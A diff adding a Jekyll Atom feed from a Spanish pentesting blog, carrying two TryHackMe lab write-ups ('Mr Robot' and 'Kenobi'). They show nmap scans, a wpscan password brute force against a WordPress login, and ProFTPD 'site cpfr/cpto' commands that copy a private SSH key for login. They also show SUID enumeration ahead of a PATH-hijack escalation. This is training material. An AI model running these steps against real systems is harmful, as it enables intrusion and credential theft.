@@ -1,0 +1,1375 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-04T06:57:09-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.115.49
+PING 10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.115.49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.115.49: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;162 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.115.49 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 161.950/161.950/161.950/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Efectivamente, vemos que recibio el paquete enviado, ahora comprabaremos que &lt;em&gt;OS&lt;/em&gt; tiene la maquina&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.115.49
+
+10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya hemos confirmado que estamos con una maquina &lt;em&gt;linux&lt;/em&gt; mediante 2 formas diferentes&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1 mediante el &lt;em&gt;ttl&lt;/em&gt; que obtuvimos del comando ping&lt;/li&gt;
+  &lt;li&gt;2 la uilidad -&lt;a href=&quot;s4vitar.github.io&quot;&gt;WichSystem.py&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;realizamos-un-escaneo-de-puertos&quot;&gt;Realizamos un escaneo de puertos&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; 10.10.115.49 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-01 14:30 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Failed to resolve &lt;span class=&quot;s2&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.115.49
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 997 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 closed tcp port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.03 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;obtenemos-una-mejor-vista-de-los-puertos-abiertos-mediante-la-utilidad-extractpors-ademas-de-que-nos-los-copia&quot;&gt;obtenemos una mejor vista de los puertos abiertos mediante la utilidad &lt;em&gt;extractPors&lt;/em&gt;, ademas de que nos los copia&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.115.49
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80,443
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+   8   │ 
+───────┴──────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Buscamos posibles vulnerabilidades en los puertos con &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 10.10.115.49
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-01 14:31 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.115.49
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
+443/tcp open  ssl/http Apache httpd
+|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+|_http-server-header: Apache
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;22.80 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;vemos la pagina web del sitio y miramos a ver que nos llama la atencion&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/MrRobot/server.txt&quot; alt=&quot;server.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;buscamos en &lt;em&gt;robots.txt&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/MrRobot/robots.txt&quot; alt=&quot;robots.txt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;encontramos 2 posibles rutas&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+ fsocity.dic
+ key-1-of-3.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;fsocity.dic&lt;/em&gt; contiene posibles nombres de usuarios y/o contraseñas&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;key-1-of-3.txt&lt;/em&gt; contiene una la primer &lt;em&gt;flag&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;hacemos-una-pausa-para-ver-los-posibles-vectores-de-ataque-que-tenemos&quot;&gt;hacemos una pausa para ver los posibles &lt;em&gt;vectores de ataque&lt;/em&gt; que tenemos&lt;/h1&gt;
+
+&lt;p&gt;mientras esperamos que termine el escaneo con &lt;em&gt;gobuster&lt;/em&gt; intentaremos hacer una identificación de usuarios mediante el login ya que
+nos permite una enumeración de usuarios&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;luego de probar varios posibles usuarios encontramos que &lt;em&gt;Elliot&lt;/em&gt; es un usuario valido (bastante logico, si recordamos el nombre
+de la maquina)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;vamos ver cuantas lineas tiene el diccionario &lt;em&gt;fsocity.dic&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fsocity.dic | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+858160
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;es un archivo bastante grande, por si acaso eliminaremos los duplicados&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sort: ordemamos las parabras&lt;/li&gt;
+  &lt;li&gt;uniq: eliminamos las repetidas
+Vemos que ahora solo tenemos 11.451 lineas&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sort &lt;/span&gt;fsocity.dic | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+❯ &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; users.txt
+11451 users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ahora-pasaremos-a-intentar-hacerle-fuerza-bruta-al-login-con-el-archivo-fsocitydic-luego-del-tratamiento-userstxtencontrado-antes&quot;&gt;ahora pasaremos a intentar hacerle fuerza bruta al login con el archivo fsocity.dic (luego del tratamiento, users.txt)encontrado antes&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;primero realize brute force con &lt;em&gt;hydra&lt;/em&gt;, pero luego de mucho tiempo lo cancele e intente con &lt;em&gt;wpscan&lt;/em&gt; y tarde menos de 5 minutos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://10.10.1.9 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; elliot &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; users.txt
+
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Valid Combinations Found:
+ | Username: elliot, Password: ER28-0652
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;luego de la largaaa espera, tenemos el usuario &lt;em&gt;Elliot&lt;/em&gt; y la contraseña &lt;em&gt;ER28-0652&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/MrRobot/worpress.png&quot; alt=&quot;imagen worpress.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Miraremos la pagina de admin a ver que podemos hacer&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.37.122
+PING 10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.37.122&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.37.122: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;154 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.37.122 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 153.968/153.968/153.968/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos ver, recibio el paquete enviado, ademas, mediante el &lt;em&gt;ttl&lt;/em&gt; podemos saber que es una maquina  &lt;em&gt;linux&lt;/em&gt;
+tambien podemos usar la utilidad &lt;em&gt;wichSystem.py&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wichSystem.py 10.10.37.122
+
+10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;fase-1-recoleción-de-información&quot;&gt;Fase 1: Recoleción de información&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi/allports.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Descripción de los parámetros:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-p- : Escanea los puertos especificados, en este caso escanea los 65535 puertos.&lt;/li&gt;
+  &lt;li&gt;-sS : Escanea TCP SYN&lt;/li&gt;
+  &lt;li&gt;–min-rate: Envía paquetes no mas lentos que el número indicado por segundo en nuestro caso 5000.&lt;/li&gt;
+  &lt;li&gt;–open: Muestra solo los puertos abiertos.&lt;/li&gt;
+  &lt;li&gt;-vvv : Muestra la información mientras se esta realizando el escaneo.&lt;/li&gt;
+  &lt;li&gt;-Pn : Omite el descubrimiento de host.&lt;/li&gt;
+  &lt;li&gt;-n : No realiza resolución DNS.&lt;/li&gt;
+  &lt;li&gt;ip: la ip que queremos escanear&lt;/li&gt;
+  &lt;li&gt;-oG : Guarda la salida del escaneo en un formato grepeable (no sea util mas adelante)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Scan the machine with nmap, how many ports are open&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;7&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;vemos que tenemos varios puertos abieros, pero nos fijamos primeramente en el port &lt;em&gt;80&lt;/em&gt; puesto que por &lt;em&gt;default&lt;/em&gt; es el usado 
+para montar un servidor web&lt;/p&gt;
+
+&lt;p&gt;-Solo esta una imagen, y no encontramos nada que nos sera muy util al momento&lt;/p&gt;
+
+&lt;p&gt;utilizaremos la herramienta &lt;em&gt;gobuster&lt;/em&gt; para buscar posibles rutas en el servidor, mientas nos da un resultado seguimos estudiando
+los puertos a ver que conseguimos&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi/gobuster.png&quot; alt=&quot;imagen gobuster&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;luego del escaneo con &lt;em&gt;gobuster&lt;/em&gt; vamos a la ruta &lt;em&gt;robots.txt&lt;/em&gt; que es la que nos llama la atencion&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+Disallow: /admin.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;vamos la ruta que encontramos en &lt;em&gt;robots.txt&lt;/em&gt; pero no encontramos nada que nos llame la atencion.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap--p-445-scriptsmb-enum-sharesnsesmb-enum-usersnse-1010210100&quot;&gt;nmap -p 445 –script=smb-enum-shares.nse,smb-enum-users.nse 10.10.210.100&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;using the nmap command, how many shares have been found?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;3&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;El comando anterior esta utilizando varios &lt;em&gt;scripts&lt;/em&gt; de nmap para intenter enumerar posibles usuarios&lt;/p&gt;
+
+&lt;h2 id=&quot;obtenemos-acceso-anonymous-e-intentermos-descargar-el-archivo-logtxt-que-esta-en-el-directorio&quot;&gt;obtenemos acceso anonymous e intentermos descargar el archivo log.txt que esta en el directorio&lt;/h2&gt;
+
+&lt;p&gt;Obtenemos esta respueta gracias a los escaneos que hemos hecho con nmap&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What port is FTP running on?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;21&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;estas-dos-soluciones-las-tenemos-previamente-con-el-escaneo-con-nmap&quot;&gt;Estas dos soluciones las tenemos previamente con el escaneo con nmap&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What is the version?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;1.3.5&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ahora vamos a buscar un &lt;em&gt;exploit&lt;/em&gt; para la version de &lt;em&gt;ProFTPD&lt;/em&gt; usando la herramienta &lt;em&gt;searchsploit&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;How many exploits are there for the ProFTPd running?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;3&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Nos conectaremos a la maquina usando &lt;em&gt;nc 10.10.98.8 21&lt;/em&gt; y usaremos los comandos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc 10.10.98.8 21
+220 ProFTPD 1.3.5 Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ProFTPD Default Installation&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.98.8]
+site cpfr /home/kenobi/.ssh/id_rsa 
+350 File or directory exists, ready &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;destination name
+site cpto /var/tmp/id_rsa
+250 Copy successful
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ahora intentaremos realizar una montura en nuestra maquina de los archivos compartidos&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;mnt
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mount 10.10.98.8:/var mnt/
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;mnt/tmp/id_rsa &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ahora procederemos a copiar la &lt;em&gt;id_rsa&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;mnt/tmp/id_rsa &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;cambiamos los permisos a &lt;em&gt;id_rsa&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;procederemos a tratar de conectarnos usando la &lt;em&gt;id_rsa&lt;/em&gt; que obtuvimos anteriormente&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa kenobi@10.10.98.8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;al estar dentro de la maquina procedemos a buscar la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;share  user.txt
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+d0b0f3f53b6caa532a83915e19224899
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ahora que hemos encontrado la primer &lt;em&gt;flag&lt;/em&gt; pasamos a buscar la manera de ganar acceso como &lt;em&gt;superusuario&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/menu
+/bin/su
+/bin/ping6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;como podemos ver, tenemos varias archivos con permisos &lt;em&gt;SUID&lt;/em&gt;, pero nos llama la atencion el llamado &lt;em&gt;menu&lt;/em&gt;
+ahora vamos a ver que funcion cumple el archivo y como nos podemos aprovechar&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;partimos de la premisa de que este archivo se ejecuta com permisos &lt;em&gt;SUID&lt;/em&gt;; Lo que intentaremos sera manipular el PATH para obtener
+una &lt;em&gt;shell&lt;/em&gt;&lt;/p&gt;
+
